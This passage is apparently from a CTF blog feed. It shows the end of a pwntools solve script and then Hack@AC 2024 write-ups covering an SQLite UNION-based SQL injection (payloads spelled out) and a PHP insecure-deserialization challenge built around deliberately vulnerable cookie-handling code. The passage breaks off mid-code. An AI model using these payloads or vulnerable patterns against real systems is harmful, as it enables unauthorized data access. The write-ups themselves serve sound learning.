</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">n1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print_flag</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>So, the file will print the value of n1, and then you will need to input n1 back.</p>
<p>This is how you can use pwntools to solve the challenge:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./challenge&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">local</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># execute the local file</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># connect to the remote instance</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challs.sieberr.live&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># get the value of n1</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;n1: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">n1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># input n1</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">n1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># interact with the process yourself, so you can see the value of the flag</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Hack@AC 2024</title>
            <link>https://enxgmatic.github.io/blog/hack@ac/</link>
            <pubDate>Thu, 29 Feb 2024 17:43:43 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/blog/hack@ac/</guid>
            <description>&lt;h1 id=&#34;hackac-2024&#34;&gt;Hack@AC 2024&lt;/h1&gt;
&lt;p&gt;I took part in Hack@AC 2024 with the team ඞඞඞඞ. We attained 4th place in the tertiary category, having the same score as 3rd place, simply submitting the last flag later than them :(&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;assets/leaderboard.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Additionally, I won the first blood prize for solving the challenge &lt;a href=&#34;#weblibwary&#34;&gt;&lt;code&gt;web/Libwary&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;-webfruit-color-query&#34;&gt;🩸 web/Fruit Color Query&lt;/h2&gt;
&lt;p&gt;One of the more interesting sql injection challenges.&lt;/p&gt;
&lt;h3 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h3&gt;
&lt;p&gt;Going to the website and using the sample apple picture provided, it seems that it outputs the colour of the fruit.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h1 id="hackac-2024">Hack@AC 2024</h1>
<p>I took part in Hack@AC 2024 with the team ඞඞඞඞ. We attained 4th place in the tertiary category, having the same score as 3rd place, simply submitting the last flag later than them :(</p>
<p><img src="assets/leaderboard.png" alt=""></p>
<p>Additionally, I won the first blood prize for solving the challenge <a href="#weblibwary"><code>web/Libwary</code></a>.</p>
<h2 id="-webfruit-color-query">🩸 web/Fruit Color Query</h2>
<p>One of the more interesting sql injection challenges.</p>
<h3 id="reconnaissance">Reconnaissance</h3>
<p>Going to the website and using the sample apple picture provided, it seems that it outputs the colour of the fruit.</p>
<div style="display:flex;">
    <img src='assets/fruit (1).png' width="48%">
    <img src='assets/fruit (2).png' width="48%">
</div>
<p>However, when you input a different jpg file, the website instead writes <code>Cannot Verify Your Picture is A Fruit. Please Add a Metadata to Your Picture.</code></p>
<img src="assets/fruit (3).png" width="75%">
<p>From my teammate&rsquo;s tinkering, she figured out that the website would refer to the picture&rsquo;s &ldquo;title&rdquo; and &ldquo;subject&rdquo; metadata  to determine the fruit type.</p>
<img src="assets/fruit (4).png" width="60%">
<p>From the sample image, when the &ldquo;title&rdquo; and &ldquo;subject&rdquo; metadata are labelled as <code>apple</code>, the website outputs red. When you change the metadata to <code>banana</code>, the website outputs yellow.</p>
<p>However, when you change the metadata to <code>flag</code> or some other bogus value, the website returns an error.</p>
<img src="assets/fruit (5).png">
<p>That was when my teammate guessed it was probably a SQL Injection challenge.</p>
<br>
<h3 id="sql-injection">SQL Injection</h3>
<p>To solve this challenge, we will make use of a <a href="https://portswigger.net/web-security/sql-injection/union-attacks">UNION</a> attack, as we need to obtain data from other tables in the database.</p>
<p>First up, we need to figure out what table and column in the database contains the flag. For this, I used <a href="https://www.sqlite.org/schematab.html"><code>sqlite_master</code></a>, a table that stores the schema of the database (this only applies to sqlite, I simply guessed that the application was using that).</p>
<p>My plan was to <code>SELECT sql FROM sqlite_master</code>, which tells us the <code>CREATE TABLE</code> query that was executed. This way, we can see the name and columns of all the tables in the database.</p>
<br>
<p>To execute that, we will edit the metadata of the file to be <code>' UNION SELECT sql FROM sqlite_master --</code>.</p>
<ul>
<li><code>'</code> closes the string</li>
<li><code>UNION SELECT</code> lets us query data outside of the current table we are in</li>
<li><code>sql</code> is the column we are selecting from the table <code>sqlite_master</code></li>
<li><code>--</code> comments out the rest of the query, so as to avoid any errors caused by the end of the query (eg the trailing <code>'</code> at the end)</li>
</ul>
<img src="assets/fruit (7).png">
<br>
<p>Thus, the full query becomes <code>SELECT &lt;colour&gt; FROM &lt;fruit_table&gt; WHERE &lt;fruit&gt;='' UNION SELECT sql FROM sqlite_master--'</code>.</p>
<p>This returns the sql of the table since <code>SELECT &lt;colour&gt; FROM &lt;fruit_table&gt; WHERE &lt;fruit&gt;=''</code> will return nothing.</p>
<br>
<p>When we input the file with the metadata as stated, we get this output:</p>
<img src="assets/fruit (6).png" width="75%">
<p>Nice, we now know the table name is <code>flag</code> and the the column is <code>flag</code> of the datatype <code>TEXT</code> (Click <a href="https://www.programiz.com/sql/create-table">here</a> for more about the CREATE TABLE syntax).</p>
<p>Now, we just need to use another UNION attack, this time to UNION SELECT the flag instead. We adjust the metadata to be <code>' UNION SELECT flag FROM flag--</code>.</p>
<img src="assets/fruit (8).png">
<p>And when we submit the image, the application returns the flag.</p>
<img src="assets/fruit (9).png" width="70%">
<p>Flag: <code>ACSI{sql1_i5_d34d?_1_d0n't_r341ly_Kn0w}</code></p>
<br>
<h3 id="a-short-note-on-union-attacks">A short note on UNION attacks</h3>
<p>When I solved the challenge, and used <code>UNION SELECT sql FROM sqlite_master</code>, it actually returned the sql schema for the fruits table instead of the flag table.</p>
<img src="assets/fruit (11).png" width="70%">
<p><code>UNION SELECT sql FROM sqlite_master</code> returns the sql schema of <u>all</u> the tables in the database (in this case, 2 tables). However, the webpage only returns the first result (between the 2 tables). Thus, it may return the wrong table.</p>
<p>To solve that problem, add <code>LIMIT 1 OFFSET 1</code> to the sql injection query. This basically offsets the result by 1, to grab the 2nd table.</p>
<img src="assets/fruit (10).png" width="70%">
<br>
<h2 id="weblibwary">🩸web/Libwary</h2>
<p>Won the first blood prize for this :D</p>
<h3 id="reconnaissance-1">Reconnaissance</h3>
<p>Pulling up the website, it let us select a book and prints out its contents, one of which is &ldquo;the flag&rdquo;. However, selecting that gives us this:</p>
<img src="assets/libwary (1).png">
<p>Additionally, the website also states our username at the top.</p>
<p>Let&rsquo;s dive into the source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">index</span><span class="o">.</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;util.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$option</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;book&#39;</span><span class="p">];</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$option</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;User&#34;</span><span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">uniqid</span><span class="p">(),</span><span class="mi">5</span><span class="p">,</span><span class="mi">9</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Libwary<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
</span></span><span class="line"><span class="cl">        <span class="cp">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="cp">            echo $user;
</span></span></span><span class="line"><span class="cl"><span class="cp">        ?&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span> Select a book to read <span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;index.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;book&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span><span class="p">&gt;</span>A Love Story<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;2&#34;</span><span class="p">&gt;</span>The Hackerman<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;3&#34;</span><span class="p">&gt;</span>The Egg<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;4&#34;</span><span class="p">&gt;</span>Exploring the Castle<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;5&#34;</span><span class="p">&gt;</span> The Flag <span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Read&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span> <span class="cp">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="cp">        if ($option != -1){
</span></span></span><span class="line"><span class="cl"><span class="cp">            $book = new Book($option);
</span></span></span><span class="line"><span class="cl"><span class="cp">            echo $book;
</span></span></span><span class="line"><span class="cl"><span class="cp">        }
</span></span></span><span class="line"><span class="cl"><span class="cp">        else{
</span></span></span><span class="line"><span class="cl"><span class="cp">            echo &#34;Please select a book to read&#34;;
</span></span></span><span class="line"><span class="cl"><span class="cp">        }
</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>A post request is sent based on the book we choose. Also, our username is obtained from our PHPSESSID cookie, which is serialized from the User class (shown below).</p>
<ul>
<li><a href="https://www.php.net/manual/en/function.serialize.php">Serialization</a> generates a storable representation of PHP values, without losing their type and structure</li>
</ul>
<p>Now, looking at <code>util.php</code>, we see 2 classes defined: <code>Book</code> and <code>User</code>. Let&rsquo;s first focus on the Book class.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$titles</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;lovestory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;hackerstory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;eggstory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;castlestory.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;flag.txt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//bro thought he was cool by using classes for everything...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Book</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$option</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$option</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$option</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;titles&#39;</span><span class="p">][</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//if option was the flag, don&#39;t allow the user to read it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span> <span class="o">==</span> <span class="mi">5</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//final defence
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//read the file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//make it look nicer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>From here, we can see why selecting &ldquo;the flag&rdquo; doesn&rsquo;t work:</p>
<p>When an object with the class <code>Book</code> is first created (via <code>__construct()</code>), if we chose &ldquo;the flag&rdquo; as the book, it will be converted to &ldquo;fakeflag.txt&rdquo; instead.</p>
<p>It also has a final defence in <code>__tostring</code> (what is represented when the Book class is treated as a string), where it removes all occurences of &ldquo;flag&rdquo; in the name of the book chosen (unless it is &ldquo;fakeflag.txt&rdquo;).</p>
<p>Now moving on to the User class:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__tostring</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Not much to say, it just consists of a name. The <code>__tostring</code> method returns the name of the user. In this case, said <code>__tostring</code> method will be triggered at the following portion of the code (<code>echo</code> is similar to <code>print</code> in outputting data to the screen).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span> Welcome to the Libwary™,  
</span></span><span class="line"><span class="cl">    <span class="cp">&lt;?php 
</span></span></span><span class="line"><span class="cl"><span class="cp">        echo $user;
</span></span></span><span class="line"><span class="cl"><span class="cp">    ?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>That is why our username is able to be dynamically displayed on the webpage.</p>
<p>So how can we solve this problem? The defences to prevent us from accessing &ldquo;flag.txt&rdquo; in <code>Book</code> all seem quite legit&hellip;</p>
<br>
<h3 id="controlling-the-cookie">Controlling the cookie</h3>
<p>Remember earlier where our username is determined from our cookie?</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;User&#34;</span><span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">uniqid</span><span class="p">(),</span><span class="mi">5</span><span class="p">,</span><span class="mi">9</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><figure>
  <img src="assets/libwary (2).png" width=70%>
  <figcaption style="text-align:center">The PHPSESSID cookie</figcaption>
</figure>
<p>Since we can control the value of the cookie, what if we decide to change the value of PHPSESSID?</p>
<ul>
<li>You can use extensions to change the value of the cookie (I am using <a href="https://cookie-editor.com/">Cookie-Editor</a>)</li>
</ul>
<br>
<p>Typing bogus values leads to the username not even being displayed. This is because we face a deserizaliation error.</p>
<figure>
  <img src="assets/libwary (3).png" width="70%">
  <figcaption style="text-align:center">Typing bogus values into the PHPSESSID cookie</figcaption>
</figure>
<figure>
  <img src="assets/libwary (7).png" width="90%">
  <figcaption style="text-align:center">When we try to unserialize bogus values, it will lead to an error</figcaption>
</figure>
<p>Thus, to change our username without throwing an error, we need to encode it the same way as how the cookie was encoded in the code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;PHPSESSID&#34;</span><span class="p">,</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">)));</span>
</span></span></code></pre></div><p>So, we need to encode it through <code>base64_encode(serialize(&lt;new_username&gt;))</code>. How about let&rsquo;s try encode the value &lsquo;hi&rsquo; as our username.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="s1">&#39;hi&#39;</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Output: czoyOiJoaSI7
</span></span></span></code></pre></div><p>Changing our PHPSESSID cookie to the output, we get &lsquo;hi&rsquo; displayed as our username!</p>
<img src="assets/libwary (4).png">
<p>So, how can we exploit this to obtain the flag?</p>
<br>
<h3 id="php-insecure-deserialization">PHP Insecure Deserialization</h3>
<p>Considering we can control PHPSESSID to display whatever we want, how if we serialize an object with the class <code>Book</code>?</p>
<ul>
<li>Remember that serialization maintains the type and structure of the object!</li>
</ul>
<p>The class <code>Book</code> will return the content of the file when printed (as per its <code>__toString</code> method).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__tostring</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//final defence
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">!=</span> <span class="s2">&#34;fakeflag.txt&#34;</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//read the file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;books/&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//make it look nicer
